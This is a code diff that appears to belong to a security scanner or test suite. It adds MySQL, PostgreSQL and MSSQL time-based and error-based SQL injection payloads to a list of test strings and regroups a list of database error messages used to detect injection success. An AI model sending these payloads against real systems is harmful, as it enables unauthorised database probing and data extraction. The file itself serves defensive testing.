@@ -19,25 +19,67 @@ SQL_INJECTION_STRINGS = [
     '"\' OR 1=1 LIMIT 1--"',
     '"admin\'--"',
     '"1\' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--"',
+    # MySQL-specific
+    '"1\' AND BENCHMARK(5000000,MD5(1))--"',
+    '"1\' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"',
+    # PostgreSQL-specific
+    '"1\'; SELECT pg_sleep(3)--"',
+    '"1\' AND 1=(SELECT 1 FROM pg_user LIMIT 1)--"',
+    # MSSQL-specific
+    '"1\'; WAITFOR DELAY \'0:0:3\'--"',
+    '"1\' AND 1=@@version--"',
 ]
 
 # Error messages commonly emitted by SQL databases that indicate injection success
 SQL_ERROR_PATTERNS = [
+    # Generic
     "syntax error",
-    "you have an error in your sql syntax",
-    "unclosed quotation mark",
-    "quoted string not properly terminated",
-    "ora-",
-    "pg_query",
-    "mysql_fetch",
-    "sqlite_",
-    "sqlstate",
-    "jdbc",
-    "odbc",
     "invalid query",
     "sql syntax",
     "unexpected token",
     "unterminated string",
+    "sqlstate",
+    "jdbc",
+    "odbc",
+    # MySQL
+    "you have an error in your sql syntax",
+    "mysql_fetch",
+    "mysql_num_rows",
+    "mysql_query",
+    "supplied argument is not a valid mysql",
+    "warning: mysql",
+    # PostgreSQL
+    "pg_query",
+    "pg_exec",
+    "unterminated quoted string at or near",
+    "postgresql",
+    "psql",
+    "pg_exception",
+    # MSSQL / SQL Server
+    "unclosed quotation mark",
+    "quoted string not properly terminated",
+    "microsoft ole db provider for sql server",
+    "odbc sql server driver",
+    "mssql_query",
+    "sqlsrv_query",
+    "incorrect syntax near",
+    "@@version",
+    # Oracle
+    "ora-",
+    "oracle error",
+    "oracle.*driver",
+    "warning.*oci_",
+    "quoted identifier",
+    # SQLite
+    "sqlite_",
+    "sqlite3",
+    "sqliteexception",
+    # Generic ORM / framework leaks
+    "activerecord",
+    "hibernate",
+    "sequelizeerror",
+    "knex",
+    "typeorm",
 ]
 
 
